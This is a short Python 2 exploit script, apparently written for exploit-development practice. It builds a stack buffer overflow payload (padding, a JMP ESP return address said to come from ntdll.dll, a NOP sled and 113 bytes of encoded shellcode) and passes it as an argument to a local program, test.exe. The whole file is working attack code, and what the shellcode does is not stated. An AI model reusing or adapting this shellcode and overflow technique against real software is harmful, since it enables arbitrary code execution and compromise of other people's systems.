import subprocess

#shellcode length = 113
shellcode=("\xdd\xc1\xb8\x7d\x5f\x6b\x07\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x13\x31\x45\x1a\x83\xed\xfc\x03\x45\x16\xe2\x88\xdc\x8f\xfb"
"\x43\x31\x1d\x6c\xc0\xd4\xce\x0f\x52\x4e\x5d\x81\x3e\xfb\x13"
"\x11\x35\x8d\xdf\xda\x3f\x7e\x4d\x57\x8f\xf5\xf3\x70\x64\x56"
"\x30\x0a\x26\x52\x30\x87\xa2\xbb\xe0\x96\xb4\x4f\xb4\x87\x6c"
"\x5f\x82\x94\x7b\x1d\xae\x49\x02\x9d\x29\xc5\x6d\xb0\x70\x9c"
"\x9d\xc7\x0f\x41\x41\xd9\x11\x7e\x45\x77\x12\x56")

# JMP ESP = 77249503 (ntdll.dll)
buf = ("A"*28) + ("\x03\x95\x24\x77") + ("\x90" * 20) + shellcode
print "Buffer: ", buf, " Buffer length: ", len(buf)

#p1 = subprocess.Popen(["C:\Program Files (x86)\Immunity Inc\Immunity Debugger\ImmunityDebugger.exe",
p1 = subprocess.Popen(["test.exe", buf],
                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = p1.communicate()
print stdout, stderr
